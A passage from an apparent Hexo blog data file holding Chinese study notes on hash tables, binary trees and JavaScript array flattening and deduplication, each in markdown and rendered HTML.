开放地址法</h5><p><strong>开放地址法</strong>是当冲突发生时，使用某种探测技术在散列表中形成一个探测序列。沿此序列逐个单元地查找，直到找到给定的关键字，或者碰到一个开放的地址（即该地址单元为空）为止（若要插入，在探查到开放的地址，则可将待插入的新结点存人该地址单元）。查找时探测到开放的地址则表明表中无待查的关键字，即查找失败</p>\n<blockquote>\n<p>当冲突发生时，使用某种探查(亦称探测)技术在散列表中寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到</p>\n</blockquote>\n<h5 id=\"b-二次哈希法\"><a href=\"#b-二次哈希法\" class=\"headerlink\" title=\"b. 二次哈希法\"></a>b. 二次哈希法</h5><p>再使用一个哈希函数，对产生地址冲突的关键字再次进行哈希计算，获取另一个哈希地址，直到不再产生冲突，这种方法不易产生“二次聚集”，但是增加的计算的时间。</p>\n<h5 id=\"c-链地址法\"><a href=\"#c-链地址法\" class=\"headerlink\" title=\"c. 链地址法\"></a>c. 链地址法</h5><p>每个哈希地址对应的一个线性表，将地址相同的记录按序写入链表，这种处理方法如果收到哈希共计，出现大量的哈希冲突，会导致查询的时间复杂度增长，甚至退化为O(n)，为了提高查询效率我们可以使用跳表或者红黑树等结构替换线性表</p>\n<h3 id=\"各数据结构时间复杂度比较\"><a href=\"#各数据结构时间复杂度比较\" class=\"headerlink\" title=\"各数据结构时间复杂度比较\"></a>各数据结构时间复杂度比较</h3><table>\n<thead>\n<tr>\n<th>分类</th>\n<th>读取</th>\n<th>更新</th>\n<th>插入</th>\n<th>删除</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数组</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(n)</td>\n<td>O(n)</td>\n</tr>\n<tr>\n<td>链表</td>\n<td>O(n)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>栈</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>队列</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>散列表</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"数据结构-常用-线性结构\"><a href=\"#数据结构-常用-线性结构\" class=\"headerlink\" title=\"数据结构-常用(线性结构)\"></a>数据结构-常用(线性结构)</h1><p>数据结构按照逻辑结构来分类，可分为 <strong>线性结构</strong> 和 <strong>非线性结构</strong></p>\n<ul>\n<li>线性结构：数组、链表、栈、队列、串等</li>\n<li>非线性结构：多维数组、树、图等</li>\n</ul>\n<h2 id=\"数组（Array）\"><a href=\"#数组（Array）\" class=\"headerlink\" title=\"数组（Array）\"></a>数组（Array）</h2><p>存储方式：在内存中占用连续完整的存储空间，最基本的存储结构之一<br>适用场景：适用于读操作多，写操作少</p>\n<h2 id=\"链表（Linked-List）\"><a href=\"#链表（Linked-List）\" class=\"headerlink\" title=\"链表（Linked List）\"></a>链表（Linked List）</h2><p>存储方式：在内存中占用非连续完整的存储空间，物理上是非连续、非顺序的，最基本的存储结构之一<br>适用场景：适用于读操作少，写操作多</p>\n<h4 id=\"双向链表（Doubly-Linked-List）\"><a href=\"#双向链表（Doubly-Linked-List）\" class=\"headerlink\" title=\"双向链表（Doubly Linked List）\"></a>双向链表（Doubly Linked List）</h4><p><strong>双向链表</strong>是链表的一种，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱</p>\n<h2 id=\"栈（Stack）\"><a href=\"#栈（Stack）\" class=\"headerlink\" title=\"栈（Stack）\"></a>栈（Stack）</h2><p>特点：后进先出，有 <strong>入栈（push）</strong> 和 <strong>出栈（pop）</strong> 操作，可用数组或链表实现</p>\n<h2 id=\"队列（Queue）\"><a href=\"#队列（Queue）\" class=\"headerlink\" title=\"队列（Queue）\"></a>队列（Queue）</h2><p>特点：先进先出，有 <strong>入队（push）</strong> 和 <strong>出队（pop）</strong> 操作，可用数组或链表实现</p>\n<blockquote>\n<p>双端队列：可以同时重队头或队尾执行 <strong>入队（push）</strong> 和 <strong>出队（pop）</strong> 操作</p>\n</blockquote>\n<h2 id=\"散列表（Hash-Table）\"><a href=\"#散列表（Hash-Table）\" class=\"headerlink\" title=\"散列表（Hash Table）\"></a>散列表（Hash Table）</h2><p>散列表也叫哈希表（hash table），这种数据结构提供了<strong>键（Key）</strong>和<strong>值（value）</strong>的映射关系，只要提供 <strong>Key</strong>，便可高效查找出所匹配的 <strong>Value</strong>，时间复杂度<strong>接近</strong>于为 <code>O(1)</code>，基于数组实现，查找快速</p>\n<h4 id=\"哈希函数\"><a href=\"#哈希函数\" class=\"headerlink\" title=\"哈希函数\"></a>哈希函数</h4><p>哈希函数是一种映射关系，根据数据的关键词 <strong>Key</strong> ，通过一定的函数关系，计算出该元素存储位置的函数</p>\n<blockquote>\n<p>哈希函数是将字符串或其他类型的 <strong>Key</strong> 转换成数组的下标 <strong>index</strong></p>\n</blockquote>\n<p>实现方式：</p>\n<ul>\n<li>直接定址法：取关键字或关键字的某个线性函数值为散列地址，即 H(key) = key 或 H(key) = a*key + b</li>\n<li>除留余数法：取关键字被某个不大于散列表长度 m 的数 p 求余，得到的作为散列地址，即 H(key) = key % p, p &lt; m</li>\n<li>位运算hash: 通过利用各种位运算（常见的是移位和异或）来充分的混合输入元素</li>\n<li>平方取中法：先计算出关键字值的平方，然后取平方值中间几位作为散列地址</li>\n<li>数字分析法：当关键字的位数大于地址的位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为散列地址</li>\n<li>随机数法：选择一个随机函数，把关键字的随机函数值作为它的哈希值</li>\n</ul>\n<h4 id=\"哈希冲突\"><a href=\"#哈希冲突\" class=\"headerlink\" title=\"哈希冲突\"></a>哈希冲突</h4><p>对应不同的关键字可能获得相同的 hash 地址，即 <code>key1≠key2</code>，但是 <code>f(key1)=f(key2)</code>。这种现象就是冲突，而且这种冲突只能尽可能的减少，不能完全避免。因为哈希函数是从关键字集合和地址集合的映像，通常关键字集合比较大，而地址集合的元素仅为哈希表中的地址值。</p>\n<h5 id=\"a-开放地址法\"><a href=\"#a-开放地址法\" class=\"headerlink\" title=\"a. 开放地址法\"></a>a. 开放地址法</h5><p><strong>开放地址法</strong>是当冲突发生时，使用某种探测技术在散列表中形成一个探测序列。沿此序列逐个单元地查找，直到找到给定的关键字，或者碰到一个开放的地址（即该地址单元为空）为止（若要插入，在探查到开放的地址，则可将待插入的新结点存人该地址单元）。查找时探测到开放的地址则表明表中无待查的关键字，即查找失败</p>\n<blockquote>\n<p>当冲突发生时，使用某种探查(亦称探测)技术在散列表中寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到</p>\n</blockquote>\n<h5 id=\"b-二次哈希法\"><a href=\"#b-二次哈希法\" class=\"headerlink\" title=\"b. 二次哈希法\"></a>b. 二次哈希法</h5><p>再使用一个哈希函数，对产生地址冲突的关键字再次进行哈希计算，获取另一个哈希地址，直到不再产生冲突，这种方法不易产生“二次聚集”，但是增加的计算的时间。</p>\n<h5 id=\"c-链地址法\"><a href=\"#c-链地址法\" class=\"headerlink\" title=\"c. 链地址法\"></a>c. 链地址法</h5><p>每个哈希地址对应的一个线性表，将地址相同的记录按序写入链表，这种处理方法如果收到哈希共计，出现大量的哈希冲突，会导致查询的时间复杂度增长，甚至退化为O(n)，为了提高查询效率我们可以使用跳表或者红黑树等结构替换线性表</p>\n<h3 id=\"各数据结构时间复杂度比较\"><a href=\"#各数据结构时间复杂度比较\" class=\"headerlink\" title=\"各数据结构时间复杂度比较\"></a>各数据结构时间复杂度比较</h3><table>\n<thead>\n<tr>\n<th>分类</th>\n<th>读取</th>\n<th>更新</th>\n<th>插入</th>\n<th>删除</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数组</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(n)</td>\n<td>O(n)</td>\n</tr>\n<tr>\n<td>链表</td>\n<td>O(n)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>栈</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>队列</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>散列表</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n<td>O(1)</td>\n</tr>\n</tbody></table>\n"},{"title":"树","date":"2020-11-14T07:48:00.000Z","_content":"\n# 数据结构-树(线性结构)\n\n树是 n 个节点的有限集合，有且仅有一个称为**根**的节点。当 n > 1 时，其余节点可分为 m 个互不相交的有限集，每一个集合本身又是一个树，并称之为根的**子树**\n\n## 二叉树\n二叉树是数的一种特殊形式，每一个节点最多有 2 个孩子节点（左子节点、右子节点）。\n\n> 通常可用数组或链表示\n\n二叉树可分为**满二叉树**和**完全二叉树**\n\n**满二叉树**：一个二叉树的所有非叶子节点都存在左右孩子，且所有的叶子节点都在同一层级上\n**完全二叉树**：一棵深度为 `k` 的有 `n` 个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为 `i`（1 ≤ i ≤ n）的结点与满二叉树中编号为 `i` 的结点在二叉树中的位置相同，则称这棵树为**完全二叉树**\n\n**二叉树的遍历方式**\n\n遍历方式分两大类：`深度优先遍历` 和 `广度优先遍历`\n\n* 深度优先遍历\n  * 前序遍历\n  * 中序遍历\n  * 后序遍历\n* 广度优先遍历\n  * 层序遍历\n\n\n\n\n","source":"_posts/数据结构/数据结构-树(非线性结构).md","raw":"---\ntitle: 树\ncategories: 数据结构\ntags: [数据结构]\ndate: 2020-11-14 15:48:00\n---\n\n# 数据结构-树(线性结构)\n\n树是 n 个节点的有限集合，有且仅有一个称为**根**的节点。当 n > 1 时，其余节点可分为 m 个互不相交的有限集，每一个集合本身又是一个树，并称之为根的**子树**\n\n## 二叉树\n二叉树是数的一种特殊形式，每一个节点最多有 2 个孩子节点（左子节点、右子节点）。\n\n> 通常可用数组或链表示\n\n二叉树可分为**满二叉树**和**完全二叉树**\n\n**满二叉树**：一个二叉树的所有非叶子节点都存在左右孩子，且所有的叶子节点都在同一层级上\n**完全二叉树**：一棵深度为 `k` 的有 `n` 个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为 `i`（1 ≤ i ≤ n）的结点与满二叉树中编号为 `i` 的结点在二叉树中的位置相同，则称这棵树为**完全二叉树**\n\n**二叉树的遍历方式**\n\n遍历方式分两大类：`深度优先遍历` 和 `广度优先遍历`\n\n* 深度优先遍历\n  * 前序遍历\n  * 中序遍历\n  * 后序遍历\n* 广度优先遍历\n  * 层序遍历\n\n\n\n\n","slug":"数据结构/数据结构-树(非线性结构)","published":1,"updated":"2021-05-03T09:21:05.041Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cko8e8td00005qf6r7shxhlsf","content":"<h1 id=\"数据结构-树-线性结构\"><a href=\"#数据结构-树-线性结构\" class=\"headerlink\" title=\"数据结构-树(线性结构)\"></a>数据结构-树(线性结构)</h1><p>树是 n 个节点的有限集合，有且仅有一个称为<strong>根</strong>的节点。当 n &gt; 1 时，其余节点可分为 m 个互不相交的有限集，每一个集合本身又是一个树，并称之为根的<strong>子树</strong></p>\n<h2 id=\"二叉树\"><a href=\"#二叉树\" class=\"headerlink\" title=\"二叉树\"></a>二叉树</h2><p>二叉树是数的一种特殊形式，每一个节点最多有 2 个孩子节点（左子节点、右子节点）。</p>\n<blockquote>\n<p>通常可用数组或链表示</p>\n</blockquote>\n<p>二叉树可分为<strong>满二叉树</strong>和<strong>完全二叉树</strong></p>\n<p><strong>满二叉树</strong>：一个二叉树的所有非叶子节点都存在左右孩子，且所有的叶子节点都在同一层级上<br><strong>完全二叉树</strong>：一棵深度为 <code>k</code> 的有 <code>n</code> 个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为 <code>i</code>（1 ≤ i ≤ n）的结点与满二叉树中编号为 <code>i</code> 的结点在二叉树中的位置相同，则称这棵树为<strong>完全二叉树</strong></p>\n<p><strong>二叉树的遍历方式</strong></p>\n<p>遍历方式分两大类：<code>深度优先遍历</code> 和 <code>广度优先遍历</code></p>\n<ul>\n<li>深度优先遍历<ul>\n<li>前序遍历</li>\n<li>中序遍历</li>\n<li>后序遍历</li>\n</ul>\n</li>\n<li>广度优先遍历<ul>\n<li>层序遍历</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"数据结构-树-线性结构\"><a href=\"#数据结构-树-线性结构\" class=\"headerlink\" title=\"数据结构-树(线性结构)\"></a>数据结构-树(线性结构)</h1><p>树是 n 个节点的有限集合，有且仅有一个称为<strong>根</strong>的节点。当 n &gt; 1 时，其余节点可分为 m 个互不相交的有限集，每一个集合本身又是一个树，并称之为根的<strong>子树</strong></p>\n<h2 id=\"二叉树\"><a href=\"#二叉树\" class=\"headerlink\" title=\"二叉树\"></a>二叉树</h2><p>二叉树是数的一种特殊形式，每一个节点最多有 2 个孩子节点（左子节点、右子节点）。</p>\n<blockquote>\n<p>通常可用数组或链表示</p>\n</blockquote>\n<p>二叉树可分为<strong>满二叉树</strong>和<strong>完全二叉树</strong></p>\n<p><strong>满二叉树</strong>：一个二叉树的所有非叶子节点都存在左右孩子，且所有的叶子节点都在同一层级上<br><strong>完全二叉树</strong>：一棵深度为 <code>k</code> 的有 <code>n</code> 个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为 <code>i</code>（1 ≤ i ≤ n）的结点与满二叉树中编号为 <code>i</code> 的结点在二叉树中的位置相同，则称这棵树为<strong>完全二叉树</strong></p>\n<p><strong>二叉树的遍历方式</strong></p>\n<p>遍历方式分两大类：<code>深度优先遍历</code> 和 <code>广度优先遍历</code></p>\n<ul>\n<li>深度优先遍历<ul>\n<li>前序遍历</li>\n<li>中序遍历</li>\n<li>后序遍历</li>\n</ul>\n</li>\n<li>广度优先遍历<ul>\n<li>层序遍历</li>\n</ul>\n</li>\n</ul>\n"},{"title":"数组操作","date":"2021-03-12T07:32:28.000Z","_content":"\n# 数组操作\n\n### 1. 数组扁平化\n\n可直接使用 ES6 提供的 `flat` 方法，如 `arr.flat(Infinity)`，可使数组扁平化\n\n```js\n// 推荐写法\nvar flatten = (arr) => {\n  if (!Array.isArray(arr)) return arr;\n\n  return arr.reduce((initArr, item) => initArr.concat(Array.isArray(item) ? flatten(item) : item), []);\n}\n\nvar arr = [1, [2, 3], [4, [5, 6]], 7]\nconsole.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] \n```\n\n```js\n// 循环处理\n\nvar flatten = (arr) => {\n  let res = [];\n\n  arr.forEach(item => {\n    if (Array.isArray(item)) {\n      res.push(...flatten(item));\n    } else {\n      res.push(item);\n    }\n  });\n\n  return res;\n}\n\nvar arr = [1, [2, 3], [4, [5, 6]], 7]\nconsole.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] \n```\n\n\n```js\n// 针对全是数字项\nvar flatten = (arr) => {\n  return arr.toString().split(',').map(item => +item);\n}\nvar arr = [1, [2, 3], [4, [5, 6]], 7]\nconsole.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] \n```\n\n### 2. 数组去重\n\n```js\n// 常规方式\nconst unique = (arr) => {\n  const res = [];\n\n  arr.forEach(item => {\n    if (!res.includes(item)) res.push(item);\n  });\n\n  return res;\n}\n\n// 利用数组自带的 api\nconst unique = (arr) => arr.filter((item, index, array) => array.indexOf(item) === index);\n\n// 使用 Set\nconst unique = (arr) => [...new Set(arr)]\n```","source":"_posts/JavaScript 编程题/数组操作.md","raw":"---\ntitle: 数组操作\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# 数组操作\n\n### 1. 数组扁平化\n\n可直接使用 ES6 提供的 `flat` 方法，如 `arr.flat(Infinity)`，可使数组扁平化\n\n```js\n// 推荐写法\nvar flatten = (arr) => {\n  if (!Array.isArray(arr)) return arr;\n\n  return arr.reduce((initArr, item) => initArr.concat(Array.isArray(item) ? flatten(item) : item), []);\n}\n\nvar arr = [1, [2, 3], [4, [5, 6]], 7]\nconsole.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] \n```\n\n```js\n// 循环处理\n\nvar flatten = (arr) => {\n  let res = [];\n\n  arr.forEach(item => {\n    if (Array.isArray(item)) {\n      res.push(...flatten(item));\n    } else {\n      res.push(item);\n    }\n  });\n\n  return res;\n}\n\nvar arr = [1, [2, 3], [4, [5, 6]], 7]\nconsole.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] \n```\n\n\n```js\n// 针对全是数字项\nvar flatten = (arr) => {\n  return arr.toString().split(',').map(item => +item);\n}\nvar arr = [1, [2, 3], [4, [5, 6]], 7]\nconsole.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] \n```\n\n### 2. 数组去重\n\n```js\n// 常规方式\nconst unique = (arr) => {\n  const res = [];\n\n  arr.forEach(item => {\n    if (!res.includes(item)) res.push(item);\n  });\n\n  return res;\n}\n\n// 利用数组自带的 api\nconst unique = (arr) => arr.filter((item, index, array) => array.indexOf(item) === index);\n\n// 使用 Set\nconst unique = (arr) => [...new Set(arr)]\n```","slug":"JavaScript 编程题/数组操作","published":1,"updated":"2021-06-02T06:11:26.168Z","_id":"ckpccb4ek0000hq6rfxr36sqx","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"数组操作\"><a href=\"#数组操作\" class=\"headerlink\" title=\"数组操作\"></a>数组操作</h1><h3 id=\"1-数组扁平化\"><a href=\"#1-数组扁平化\" class=\"headerlink\" title=\"1. 数组扁平化\"></a>1. 数组扁平化</h3><p>可直接使用 ES6 提供的 <code>flat</code> 方法，如 <code>arr.flat(Infinity)</code>，可使数组扁平化</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 推荐写法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> flatten = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"built_in\">Array</span>.isArray(arr)) <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr.reduce(<span class=\"function\">(<span class=\"params\">initArr, item</span>) =&gt;</span> initArr.concat(<span class=\"built_in\">Array</span>.isArray(item) ? flatten(item) : item), []);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, [<span class=\"number\">5</span>, <span class=\"number\">6</span>]], <span class=\"number\">7</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(flatten(arr)); <span class=\"comment\">// [ 1, 2, 3, 4, 5, 6, 7 ] </span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 循环处理</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> flatten = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Array</span>.isArray(item)) &#123;</span><br><span class=\"line\">      res.push(...flatten(item));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      res.push(item);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, [<span class=\"number\">5</span>, <span class=\"number\">6</span>]], <span class=\"number\">7</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(flatten(arr)); <span class=\"comment\">// [ 1, 2, 3, 4, 5, 6, 7 ] </span></span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 针对全是数字项</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> flatten = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr.toString().split(<span class=\"string\">&#x27;,&#x27;</span>).map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> +item);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, [<span class=\"number\">5</span>, <span class=\"number\">6</span>]], <span class=\"number\">7</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(flatten(arr)); <span class=\"comment\">// [ 1, 2, 3, 4, 5, 6, 7 ] </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-数组去重\"><a href=\"#2-数组去重\" class=\"headerlink\" title=\"2. 数组去重\"></a>2. 数组去重</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 常规方式</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> unique = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!res.includes(item)) res.push(item);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 利用数组自带的 api</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> unique = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> arr.filter(<span class=\"function\">(<span class=\"params\">item, index, array</span>) =&gt;</span> array.indexOf(item) === index);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 Set</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> unique = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> [...new <span class=\"built_in\">Set</span>(arr)]</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"数组操作\"><a href=\"#数组操作\" class=\"headerlink\" title=\"数组操作\"></a>数组操作</h1><h3 id=\"1-数组扁平化\"><a href=\"#1-数组扁平化\" class=\"headerlink\" title=\"1. 数组扁平化\"></a>1. 数组扁平化</h3><p>可直接使用 ES6 提供的 <code>flat</code> 方法，如 <code>arr.flat(Infinity)</code>，可使数组扁平化</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 推荐写法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> flatten = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"built_in\">Array</span>.isArray(arr)) <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr.reduce(<span class=\"function\">(<span class=\"params\">initArr, item</span>) =&gt;</span> initArr.concat(<span class=\"built_in\">Array</span>.isArray(item) ? flatten(item) : item), []);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, [<span class=\"number\">5</span>, <span class=\"number\">6</span>]], <span class=\"number\">7</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(flatten(arr)); <span class=\"comment\">// [ 1, 2, 3, 4, 5, 6, 7 ] </span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 循环处理</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> flatten = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Array</span>.isArray(item)) &#123;</span><br><span class=\"line\">      res.push(...flatten(item));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      res.push(item);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, [<span class=\"number\">5</span>, <span class=\"number\">6</span>]], <span class=\"number\">7</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(flatten(arr)); <span class=\"comment\">// [ 1, 2, 3, 4, 5, 6, 7 ] </span></span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 针对全是数字项</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> flatten = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr.toString().split(<span class=\"string\">&#x27;,&#x27;</span>).map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> +item);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, [<span class=\"number\">5</span>, <span class=\"number\">6</span>]], <span class=\"number\">7</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(flatten(arr)); <span class=\"comment\">// [ 1, 2, 3, 4, 5, 6, 7 ] </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-数组去重\"><a href=\"#2-数组去重\" class=\"headerlink\" title=\"2. 数组去重\"></a>2. 数组去重</h3><figure 